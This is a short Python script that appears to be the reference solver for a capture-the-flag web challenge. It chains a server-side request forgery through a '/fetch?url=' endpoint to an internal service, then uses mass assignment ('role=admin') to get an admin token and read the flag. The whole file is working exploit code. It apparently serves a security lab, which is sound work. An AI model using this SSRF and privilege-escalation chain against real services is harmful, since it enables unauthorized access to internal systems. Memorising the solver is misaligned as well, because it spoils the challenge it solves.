"""Reference solver: SSRF -> internal mass-assignment admin token -> internal flag."""
import sys
import urllib.parse
import urllib.request

INTERNAL = "http://127.0.0.1:9000"


def fetch(base, url):
    q = urllib.parse.urlencode({"url": url})
    with urllib.request.urlopen(f"{base}/fetch?{q}", timeout=10) as r:
        return r.read().decode(errors="replace")


def main(host, port):
    base = f"http://{host}:{port}"
    token = fetch(base, f"{INTERNAL}/internal/token?user=guest&role=admin").strip()
    flag = fetch(base, f"{INTERNAL}/internal/flag?token={urllib.parse.quote(token)}").strip()
    print(flag)


if __name__ == "__main__":
    main(sys.argv[1], int(sys.argv[2]))
